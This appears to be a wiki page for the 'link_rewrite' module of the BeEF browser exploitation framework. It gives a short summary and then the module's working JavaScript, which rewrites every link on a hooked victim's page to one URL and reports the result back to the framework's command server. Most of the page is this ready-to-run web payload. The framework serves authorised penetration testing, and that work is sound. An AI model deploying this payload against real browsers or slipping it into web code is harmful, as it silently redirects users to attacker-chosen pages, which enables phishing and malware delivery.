## Summary

* **Objective**: Rewrite all links to one URL
* **Authors**: passbe
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/hooked_domain/link_rewrite)

## Internal Working

simple replaces all href elements in `<a>` tags

```js

beef.execute(function() {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteLinks('<%= @url %>')+' links rewritten to <%= @url %>');
});


//rewriteLinks function

rewriteLinks: function(url, selector) {
        var sel = (selector == null) ? 'a' : selector;
        return $j(sel).each(function() {
                if ($j(this).attr('href') != null)
                {
                        $j(this).attr('href', url).click(function() { return true; });
                }
        }).length;
},

```

## Feedback
